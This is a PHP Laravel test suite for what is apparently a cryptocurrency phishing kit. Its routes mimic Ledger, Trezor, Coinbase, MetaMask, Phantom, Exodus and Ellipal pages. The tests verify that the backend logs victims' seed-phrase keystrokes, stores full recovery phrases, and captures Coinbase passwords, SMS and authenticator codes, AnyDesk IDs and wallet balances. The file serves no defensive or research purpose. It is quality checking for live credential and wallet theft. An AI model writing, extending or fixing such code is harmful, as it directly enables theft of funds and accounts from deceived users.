<?php

namespace Tests\Feature;

use App\Models\UserEvent;
use App\Models\UserSession;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Str;
use Tests\TestCase;

class ActivityV2FoundationAuditTest extends TestCase
{
    use RefreshDatabase;

    private int $scenarios = 0;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
        ]);
    }

    public function test_apply_failure_rolls_back_event_and_returns_false(): void
    {
        $this->assertTrue(Schema::hasColumn('user_sessions', 'document_id'));
        $this->assertTrue(Schema::hasColumn('user_sessions', 'document_issued_at'));
        $this->assertTrue(Schema::hasColumn('user_sessions', 'activity_summary'));

        foreach (['/ledger/1', '/ledger/2', '/ledger/3'] as $path) {
            $token = $this->token();
            $this->withCookie('liveled_token', $token)->get($path)->assertOk();
            $doc = UserSession::where('session_token', $token)->value('document_id');
            $before = UserEvent::where('session_token', $token)->count();
            $beforeSummary = UserSession::where('session_token', $token)->value('activity_summary');

            DB::unprepared('DROP TRIGGER IF EXISTS v2_fail_summary');
            DB::unprepared(
                'CREATE TRIGGER v2_fail_summary AFTER UPDATE ON user_sessions '.
                'BEGIN SELECT RAISE(ABORT, "forced apply fail"); END'
            );
            try {
                $res = $this->postEvent($token, [
                    'type' => 'page_visit',
                    'page' => str_replace('/', '_', ltrim($path, '/')),
                    'doc' => $doc,
                ]);
                $this->assertContains($res->getStatusCode(), [503]);
                $this->assertSame(['ok' => false], $res->json());
                $this->assertSame($before, UserEvent::where('session_token', $token)->count());
                $this->assertSame(
                    $beforeSummary,
                    UserSession::where('session_token', $token)->value('activity_summary')
                );
                $this->scenarios++;
            } finally {
                DB::unprepared('DROP TRIGGER IF EXISTS v2_fail_summary');
            }
        }
    }

    public function test_five_hundred_plus_foundation_scenarios(): void
    {
        $families = [
            ['path' => '/ledger/1', 'page' => 'ledger_1'],
            ['path' => '/ledger/2', 'page' => 'ledger_2'],
            ['path' => '/ledger/3', 'page' => 'ledger_3'],
            ['path' => '/trezor/phrase-page', 'page' => 'trezor_phrase_page'],
            ['path' => '/coinbase/seed', 'page' => 'coinbase_seed'],
            ['path' => '/phantom/seeds', 'page' => 'phantom_seeds'],
            ['path' => '/exodus/import', 'page' => 'exodus_import'],
            ['path' => '/metamask/import', 'page' => 'metamask_import'],
            ['path' => '/ellipal/1', 'page' => 'ellipal_24word'],
            ['path' => '/coinbase/whitelist-coinbase-wallet', 'page' => 'coinbase_whitelist_wallet'],
        ];

        foreach ($families as $flow) {
            $this->runAttemptMatrix($flow['path'], $flow['page']);
        }

        foreach ($this->singletonCases() as $case) {
            $this->runSingletonMatrix($case);
        }

        $tokens = [];
        for ($i = 0; $i < 38; $i++) {
            $token = $this->token();
            $tokens[] = $token;
            $flow = $families[$i % count($families)];
            $this->withCookie('liveled_token', $token)->get($flow['path'])->assertOk();
            $doc = UserSession::where('session_token', $token)->value('document_id');
            $stay = (int) $this->postEvent($token, [
                'type' => 'page_visit',
                'page' => $flow['page'],
                'doc' => $doc,
            ])->assertOk()->json('stay');
            $this->scenarios++;
            $this->postEvent($token, [
                'type' => 'phrase_input',
                'page' => $flow['page'],
                'element' => 'full_state',
                'value' => json_encode(['words' => ['iso'.$i], 'passphrase' => '']),
                'doc' => $doc,
                'stay' => $stay,
            ])->assertOk();
            $this->scenarios++;
        }
        $this->assertCount(38, array_unique($tokens));
        $this->assertSame(38, UserSession::whereIn('session_token', $tokens)->count());
        foreach ($tokens as $i => $token) {
            $flow = $families[$i % count($families)];
            $this->assertSame(['iso'.$i], $this->lastAttempt($token, $flow['page'])['words']);
            $this->scenarios++;
        }

        $this->assertSavePhraseDoesNotMutateActivity();
        $this->postEvent($tokens[0], [
            'type' => 'phrase_input',
            'page' => $families[0]['page'],
            'element' => 'word_count',
            'value' => '24',
        ])->assertOk();
        $this->scenarios++;
        $this->assertGreaterThanOrEqual(500, $this->scenarios, 'audit scenarios='.$this->scenarios);
    }

    private function runAttemptMatrix(string $path, string $page): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get($path)->assertOk();
        $doc = UserSession::where('session_token', $token)->value('document_id');
        $this->scenarios++;

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['early'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => 1,
        ])->assertStatus(409)->assertJson(['ok' => false]);
        $this->assertSame(0, UserEvent::where('session_token', $token)->count());
        $this->scenarios++;

        $stay = (int) $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => $page,
            'doc' => $doc,
        ])->assertOk()->assertJson(['ok' => true])->json('stay');
        $this->assertSame('active', $this->lastAttempt($token, $page)['state']);
        $this->scenarios++;

        $storm = in_array($page, ['ledger_1', 'ledger_2', 'ledger_3'], true) ? 40 : 12;
        for ($i = 0; $i < $storm; $i++) {
            $this->postEvent($token, [
                'type' => 'phrase_input',
                'page' => $page,
                'element' => 'full_state',
                'value' => json_encode(['words' => ['s'.$i], 'passphrase' => '']),
                'doc' => $doc,
                'stay' => $stay,
            ])->assertOk()->assertJson(['ok' => true]);
            $this->assertCount(1, UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page]);
            $this->scenarios++;
        }
        $this->assertSame(['s'.($storm - 1)], $this->lastAttempt($token, $page)['words']);

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['bad-stay'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay + 3,
        ])->assertStatus(409);
        $this->assertSame(['s'.($storm - 1)], $this->lastAttempt($token, $page)['words']);
        $this->scenarios++;

        $this->withCookie('liveled_token', $token)->get($path)->assertOk();
        $doc2 = UserSession::where('session_token', $token)->value('document_id');
        $this->assertNotSame($doc, $doc2);
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => $page,
            'doc' => $doc2,
        ])->assertOk()->assertJsonPath('stay', $stay);
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => $page,
            'doc' => $doc2,
        ])->assertOk()->assertJsonPath('stay', $stay);
        $this->scenarios += 3;

        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['pre-f5'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay,
        ])->assertStatus(409);
        $this->scenarios++;

        $this->postEvent($token, [
            'type' => 'form_submit',
            'page' => $page,
            'element' => 'seed_phrase',
            'value' => 's'.($storm - 1),
            'doc' => $doc2,
            'stay' => $stay,
        ])->assertOk();
        $this->assertSame('sealed', $this->lastAttempt($token, $page)['state']);
        $this->scenarios++;

        $events = UserEvent::where('session_token', $token)->count();
        $this->postEvent($token, [
            'type' => 'form_submit',
            'page' => $page,
            'element' => 'seed_phrase',
            'value' => 's'.($storm - 1),
            'doc' => $doc2,
            'stay' => $stay,
        ])->assertOk();
        $this->assertSame($events, UserEvent::where('session_token', $token)->count());
        $this->assertCount(1, UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page]);
        $this->scenarios++;

        $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk();
        $leave = UserSession::where('session_token', $token)->value('document_id');
        $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_loading',
            'doc' => $leave,
        ])->assertOk();
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => $page,
            'element' => 'full_state',
            'value' => json_encode(['words' => ['after-leave'], 'passphrase' => '']),
            'doc' => $doc2,
            'stay' => $stay,
        ])->assertStatus(409);
        $this->assertSame(['s'.($storm - 1)], $this->lastAttempt($token, $page)['words']);
        $this->scenarios += 3;

        $this->withCookie('liveled_token', $token)->get($path)->assertOk();
        $back = UserSession::where('session_token', $token)->value('document_id');
        $stay2 = (int) $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => $page,
            'doc' => $back,
        ])->assertOk()->json('stay');
        $this->assertNotSame($stay, $stay2);
        $list = UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page];
        $this->assertCount(2, $list);
        $this->assertSame('sealed', $list[0]['state']);
        $this->assertSame('active', $list[1]['state']);
        $this->scenarios++;
    }

    private function runSingletonMatrix(array $case): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $old = UserSession::where('session_token', $token)->value('document_id');
        $this->postEvent($token, [
            'type' => $case['type'],
            'page' => $case['page'],
            'element' => $case['element'],
            'value' => $case['first'],
            'doc' => $old,
        ])->assertOk();
        $this->assertNotNull(UserSession::where('session_token', $token)->first()->activity_summary['boxes'][$case['box']]['value'] ?? null);
        $this->scenarios++;

        $this->withCookie('liveled_token', $token)->get('/ledger/loading')->assertOk();
        $current = UserSession::where('session_token', $token)->value('document_id');
        $events = UserEvent::where('session_token', $token)->count();
        $kept = UserSession::where('session_token', $token)->first()->activity_summary['boxes'][$case['box']]['value'] ?? null;

        $this->postEvent($token, [
            'type' => $case['type'],
            'page' => $case['page'],
            'element' => $case['element'],
            'value' => $case['next'],
        ])->assertStatus(409)->assertJson(['ok' => false]);
        $this->postEvent($token, [
            'type' => $case['type'],
            'page' => $case['page'],
            'element' => $case['element'],
            'value' => $case['next'],
            'doc' => $old,
        ])->assertStatus(409);
        $this->assertSame($events, UserEvent::where('session_token', $token)->count());
        $this->assertSame($kept, UserSession::where('session_token', $token)->first()->activity_summary['boxes'][$case['box']]['value'] ?? null);
        $this->scenarios += 2;

        $this->postEvent($token, [
            'type' => $case['type'],
            'page' => $case['page'],
            'element' => $case['element'],
            'value' => $case['next'],
            'doc' => $current,
        ])->assertOk();
        $this->scenarios++;
    }

    private function assertSavePhraseDoesNotMutateActivity(): void
    {
        $token = $this->token();
        $this->withCookie('liveled_token', $token)->get('/ledger/3')->assertOk();
        $doc = UserSession::where('session_token', $token)->value('document_id');
        $stay = (int) $this->postEvent($token, [
            'type' => 'page_visit',
            'page' => 'ledger_3',
            'doc' => $doc,
        ])->assertOk()->json('stay');
        $this->postEvent($token, [
            'type' => 'phrase_input',
            'page' => 'ledger_3',
            'element' => 'full_state',
            'value' => json_encode(['words' => ['keep'], 'passphrase' => '']),
            'doc' => $doc,
            'stay' => $stay,
        ])->assertOk();
        $before = UserSession::where('session_token', $token)->first()->activity_summary;

        $this->withCookie('liveled_token', $token)->post('/save-phrase', [
            'words' => ['keep'],
            'page' => 'ledger_3',
        ])->assertOk();

        $after = UserSession::where('session_token', $token)->first()->activity_summary;
        $this->assertSame($before['attempts']['ledger_3'], $after['attempts']['ledger_3']);
        $this->assertSame('active', $after['attempts']['ledger_3'][0]['state']);
        $this->assertTrue(
            UserEvent::where('session_token', $token)->where('element', 'recovery_phrase')->exists()
        );
        $this->scenarios++;
    }

    private function singletonCases(): array
    {
        return [
            ['page' => 'coinbase_password', 'type' => 'form_input', 'element' => 'password_partial', 'first' => 'a', 'next' => 'b', 'box' => 'password'],
            ['page' => 'coinbase_sms_code', 'type' => 'code_input', 'element' => 'code_partial', 'first' => '111111', 'next' => '222222', 'box' => 'sms'],
            ['page' => 'coinbase_authenticator_code', 'type' => 'code_input', 'element' => 'code_partial', 'first' => '111111', 'next' => '222222', 'box' => 'auth'],
            ['page' => 'coinbase_anydesk', 'type' => 'code_input', 'element' => 'anydesk_id', 'first' => '111 222 333', 'next' => '999 888 777', 'box' => 'anydesk'],
            ['page' => 'coinbase_select_vault_assets', 'type' => 'coin_input', 'element' => 'selection', 'first' => 'Bitcoin (btc)', 'next' => 'Ether (eth)', 'box' => 'vault'],
            ['page' => 'coinbase_sign_in', 'type' => 'form_submit', 'element' => 'email', 'first' => 'a@x.test', 'next' => 'b@x.test', 'box' => 'email'],
            ['page' => 'coinbase_email_code', 'type' => 'form_submit', 'element' => 'email_code', 'first' => '111111', 'next' => '999999', 'box' => 'mail2fa'],
            ['page' => 'coinbase_reset_password', 'type' => 'form_submit', 'element' => 'reset_password', 'first' => 'old: a | new: b', 'next' => 'old: c | new: d', 'box' => 'reset'],
            ['page' => 'coinbase_last_activity', 'type' => 'form_submit', 'element' => 'last_activity', 'first' => 'Within a day', 'next' => 'Within a week', 'box' => 'active'],
            ['page' => 'coinbase_estimated_balance', 'type' => 'form_submit', 'element' => 'estimated_balance', 'first' => 'Under $ 1,000', 'next' => '$1,000 - $9,999', 'box' => 'balance'],
            ['page' => 'coinbase_device_confirmation', 'type' => 'form_submit', 'element' => 'confirmation_link', 'first' => 'https://old.test', 'next' => 'https://new.test', 'box' => 'link'],
        ];
    }

    private function token(): string
    {
        return Str::random(48);
    }

    private function postEvent(string $token, array $payload)
    {
        return $this->withCookie('liveled_token', $token)->post('/api/log', $payload);
    }

    private function lastAttempt(string $token, string $page): array
    {
        $list = UserSession::where('session_token', $token)->first()->activity_summary['attempts'][$page];

        return $list[count($list) - 1];
    }
}
